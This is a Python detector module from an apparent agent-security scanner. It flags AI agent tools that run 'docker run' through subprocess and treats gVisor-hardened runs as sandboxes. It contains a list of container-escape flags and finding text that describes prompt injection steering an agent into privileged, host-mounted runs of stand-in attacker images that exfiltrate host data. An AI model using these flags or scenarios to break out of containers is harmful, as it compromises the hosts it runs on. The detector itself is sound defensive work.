"""AG-DOCKER-EXEC: subprocess call with docker run in agent tool body.

Corpus-derived detector (2026-07-28). Found in:
  - OpenAI Agents Dapr example:
      subprocess.run(["docker", "run", "--rm", image, ...])
  - Similar patterns in agent sandboxing tools

Why it matters:
  Container escape is the MOST DANGEROUS execution escalation in agentic systems.
  When an agent can call `docker run` with arbitrary arguments:
  - Volume mounts let it read/write the host filesystem: `docker run -v /:/host ...`
  - `--privileged` grants raw kernel access
  - `--network=host` bypasses container network isolation
  - The LLM (or a prompt injection) can supply any docker arguments via the tool
    parameter — including container images pulled from attacker-controlled registries

  This is fundamentally different from subprocess.run(["ls"]) — Docker gives the
  attacker a fresh clean environment to operate from, PLUS host access via mounts.

Detection: AST scan for subprocess.run/Popen/check_output calls whose first argument
(the command list or string) contains "docker" followed by "run".
"""

import ast
from pathlib import Path

from lucin.models import Agent, Finding, Severity
from lucin.owasp import owasp_ref

# subprocess-family calls that could invoke docker
_SUBPROCESS_SINKS = {
    "subprocess.run", "subprocess.Popen", "subprocess.check_output",
    "subprocess.call", "subprocess.check_call",
    "os.system", "os.popen",
    "run", "Popen", "check_output", "call", "check_call",
}


def _expr_is_docker_run(expr, var_defs: dict, depth: int = 0) -> bool:
    """Return True if an expression evaluates to a 'docker run ...' command.

    Handles literals, f-strings, string concatenation, list literals, AND
    variables assembled earlier in the function (resolved via var_defs) — e.g.
        cmd = f"docker run --privileged {image}"
        subprocess.check_output(cmd, shell=True)   # first arg is the variable `cmd`
    which the literal-only checks used to miss (container_escape recall gap).
    """
    if expr is None or depth > 6:
        return False

    # List literal — ["docker", "run", ...]
    if isinstance(expr, ast.List):
        def _str_val(node) -> str:
            if isinstance(node, ast.Constant) and isinstance(node.value, str):
                return node.value.lower()
            return ""
        elt_strs = [_str_val(e) for e in expr.elts[:4]]
        docker_idx = next((i for i, s in enumerate(elt_strs) if "docker" in s), -1)
        if docker_idx >= 0 and any("run" in s for s in elt_strs[docker_idx:docker_idx + 3]):
            return True
        return False

    # String constant — "docker run ..."
    if isinstance(expr, ast.Constant) and isinstance(expr.value, str):
        val = expr.value.lower()
        return "docker" in val and "run" in val

    # f-string — join the constant parts and look for docker + run
    if isinstance(expr, ast.JoinedStr):
        parts = [p.value.lower() for p in expr.values
                 if isinstance(p, ast.Constant) and isinstance(p.value, str)]
        joined = "".join(parts)
        return "docker" in joined and "run" in joined

    # String concatenation — "docker run " + image  (recurse both sides)
    if isinstance(expr, ast.BinOp) and isinstance(expr.op, ast.Add):
        return (_expr_is_docker_run(expr.left, var_defs, depth + 1)
                or _expr_is_docker_run(expr.right, var_defs, depth + 1))

    # Variable — resolve to the expression it was assigned from, in this function.
    if isinstance(expr, ast.Name):
        definition = var_defs.get(expr.id)
        if definition is not None:
            return _expr_is_docker_run(definition, var_defs, depth + 1)
        return False

    # str.format / .join wrappers around a docker-run base string
    if isinstance(expr, ast.Call) and isinstance(expr.func, ast.Attribute):
        if expr.func.attr in ("format", "join"):
            if _expr_is_docker_run(expr.func.value, var_defs, depth + 1):
                return True
            return any(_expr_is_docker_run(a, var_defs, depth + 1) for a in expr.args)

    return False


# Flags that actually BREAK the container boundary — the thing this detector is for.
_ESCAPE_FLAGS = (
    "--privileged", "--pid=host", "--pid host", "--net=host", "--net host",
    "--network=host", "--network host", "--ipc=host", "--userns=host",
    "-v /:", "--volume /:", "/var/run/docker.sock", "--cap-add=sys_admin",
    "--cap-add sys_admin", "--security-opt seccomp=unconfined",
    "--security-opt=seccomp=unconfined", "--device=/dev",
)
# Flags that make a run MORE confined, not less — a sandbox, i.e. the mitigation.
_HARDENING_FLAGS = (
    "--runtime=runsc", "--runtime runsc", "gvisor", "--read-only",
    "--network=none", "--network none", "--net=none",
    "--security-opt=no-new-privileges", "--security-opt no-new-privileges",
    "--cap-drop=all", "--cap-drop all", "--user nobody",
)


def _literal_text(expr, var_defs: dict | None = None, depth: int = 0) -> str:
    """Best-effort literal text of a command expression (for flag inspection).

    Resolves variables through `var_defs` exactly as `_expr_is_docker_run` does —
    real code builds `docker_cmd = ["docker", "run", "--runtime=runsc", ...]` and
    then passes the NAME to subprocess, so a Name-blind version saw no flags at all
    and the hardening veto silently never fired.
    """
    if expr is None or depth > 6:
        return ""
    if isinstance(expr, ast.Constant) and isinstance(expr.value, str):
        return expr.value.lower()
    if isinstance(expr, ast.List):
        return " ".join(_literal_text(e, var_defs, depth + 1) for e in expr.elts)
    if isinstance(expr, ast.JoinedStr):
        return " ".join(_literal_text(v, var_defs, depth + 1) for v in expr.values)
    if isinstance(expr, ast.BinOp) and isinstance(expr.op, ast.Add):
        return (_literal_text(expr.left, var_defs, depth + 1) + " "
                + _literal_text(expr.right, var_defs, depth + 1))
    if isinstance(expr, ast.Name) and var_defs:
        return _literal_text(var_defs.get(expr.id), var_defs, depth + 1)
    return ""


def _is_hardened_sandbox_run(expr, var_defs: dict | None = None) -> bool:
    """True iff this `docker run` CONFINES rather than escapes.

    Measured false positives on real repos (2026-07-30): this detector fired on
    potpie's `_run_with_docker_gvisor` and `_check_docker_available` — a **gVisor
    sandbox runner** and its literal `--runtime=runsc` availability probe — i.e. it
    reported the mitigation as the vulnerability (0 TP / 3 FP on the sampled
    AG-DOCKER-EXEC findings). A run carrying hardening flags and NO boundary-
    breaking flag is a sandbox; flagging it as a container-escape vector is wrong.
    """
    text = _literal_text(expr, var_defs)
    if not text:
        return False
    if any(f in text for f in _ESCAPE_FLAGS):
        return False          # an escape flag always wins
    return any(f in text for f in _HARDENING_FLAGS)


def _command_contains_docker_run(call_node: ast.Call, var_defs: dict | None = None) -> bool:
    """Return True if the call appears to invoke 'docker run' (incl. via a variable)."""
    if not call_node.args:
        return False
    arg0 = call_node.args[0]
    if not _expr_is_docker_run(arg0, var_defs or {}):
        return False
    # A hardened/confining run is the MITIGATION, not the escape vector.
    if _is_hardened_sandbox_run(arg0, var_defs or {}):
        return False
    return True


def _build_var_defs(func_node: ast.FunctionDef) -> dict:
    """Map variable name → first assigned RHS expression within the function."""
    defs: dict = {}
    for node in ast.walk(func_node):
        if isinstance(node, ast.Assign) and len(node.targets) == 1 \
                and isinstance(node.targets[0], ast.Name):
            defs.setdefault(node.targets[0].id, node.value)
        elif isinstance(node, ast.AnnAssign) and isinstance(node.target, ast.Name) \
                and node.value is not None:
            defs.setdefault(node.target.id, node.value)
    return defs


def _get_call_name(call_node: ast.Call) -> str:
    """Return the simple function/method name for a Call node."""
    func = call_node.func
    if isinstance(func, ast.Attribute):
        parts = []
        node = func
        while isinstance(node, ast.Attribute):
            parts.append(node.attr)
            node = node.value
        if isinstance(node, ast.Name):
            parts.append(node.id)
        parts.reverse()
        return ".".join(parts)
    if isinstance(func, ast.Name):
        return func.id
    return ""


def detect_docker_exec(agent: Agent) -> list[Finding]:
    """Detect agent tools that invoke `docker run` via subprocess."""
    findings = []
    scanned: set[str] = set()

    sources = set()
    if agent.source_file:
        sources.add(agent.source_file)
    for tool in agent.tools:
        if tool.source_file:
            sources.add(tool.source_file)

    for filepath in sources:
        if filepath in scanned:
            continue
        scanned.add(filepath)

        try:
            source = Path(filepath).read_text(encoding="utf-8")
            tree = ast.parse(source)
        except Exception:
            continue

        for func_node in ast.walk(tree):
            # E2: async def tools invoke subprocess/docker exactly like sync ones.
            if not isinstance(func_node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                continue

            # Only scan functions that look like tools or capability-bearing code
            has_docker_run = False
            tainted_cmd = False
            var_defs = _build_var_defs(func_node)

            for call_node in ast.walk(func_node):
                if not isinstance(call_node, ast.Call):
                    continue
                call_name = _get_call_name(call_node)
                if not any(s in call_name for s in ("subprocess", "Popen", "os.system",
                                                     "os.popen", "check_output", "check_call")):
                    if call_name not in ("run", "Popen", "call", "check_output", "check_call"):
                        continue

                if _command_contains_docker_run(call_node, var_defs):
                    has_docker_run = True
                    # Check if any arg to the outer function reaches the docker call
                    param_names = {a.arg for a in func_node.args.args} - {"self", "cls"}
                    if param_names:
                        # If docker command is dynamic (not a single hardcoded literal),
                        # treat as LLM-controllable. Resolve one level through a variable so
                        # `cmd = f"docker run {image}"; run(cmd)` is recognised as tainted.
                        first = call_node.args[0] if call_node.args else None
                        resolved = first
                        if isinstance(first, ast.Name) and first.id in var_defs:
                            resolved = var_defs[first.id]
                        if resolved is not None and not isinstance(resolved, ast.Constant):
                            tainted_cmd = True
                    break

            if not has_docker_run:
                continue

            severity = Severity.CRITICAL if tainted_cmd else Severity.HIGH

            findings.append(Finding(
                id="AG-DOCKER-EXEC",
                title=f"Container Escape Vector: docker run in '{func_node.name}'",
                severity=severity,
                description=(
                    f"Function '{func_node.name}' calls subprocess with 'docker run'. "
                    f"An attacker via prompt injection can supply arbitrary docker flags:\n"
                    f"  - Volume mounts: `-v /:/host` → host filesystem read/write\n"
                    f"  - Privileged mode: `--privileged` → kernel-level access\n"
                    f"  - Network bypass: `--network=host` → host network access\n"
                    f"  - Malicious image: `attacker.io/malware:latest` → code execution\n\n"
                    f"Tainted command (LLM-controlled args): {'YES' if tainted_cmd else 'POSSIBLE — verify docker args source'}"
                ),
                agent_name=agent.name,
                attack_scenario=(
                    "1. Attacker embeds docker flags in document/tool input\n"
                    "2. Agent calls this function with injected flags\n"
                    "3. `docker run -v /:/host attacker/exfil:latest` mounts host fs\n"
                    "4. Container reads/writes arbitrary host files and exfiltrates data\n"
                    "Worst case: `docker run --privileged --network=host` = full host compromise"
                ),
                blast_radius=(
                    "Full host filesystem access (via -v mount), network bypass, "
                    "potential kernel exploit via --privileged. Effectively root on the host."
                ),
                owasp_ref=owasp_ref("AG-DOCKER-EXEC"),
                fix_suggestion=(
                    "Options (in order of preference):\n"
                    "  1. Remove docker exec capability from agent tools entirely\n"
                    "  2. Use a secure sandboxing API (gVisor, Firecracker) instead\n"
                    "  3. If docker is required: validate/allowlist image name, strip ALL\n"
                    "     dangerous flags (-v, --privileged, --network, --cap-add)\n"
                    "  4. Run docker with `--security-opt=no-new-privileges` and read-only\n"
                    "  5. Require HITL approval before any docker run call"
                ),
                source_file=filepath,
                source_line=func_node.lineno,
                witness=[f"subprocess with docker run in '{func_node.name}' (line {func_node.lineno})"],
            ))

    # de-duplicate
    seen: set[tuple] = set()
    unique = []
    for f in findings:
        key = (f.source_file, f.source_line, f.id)
        if key not in seen:
            seen.add(key)
            unique.append(f)
    return unique
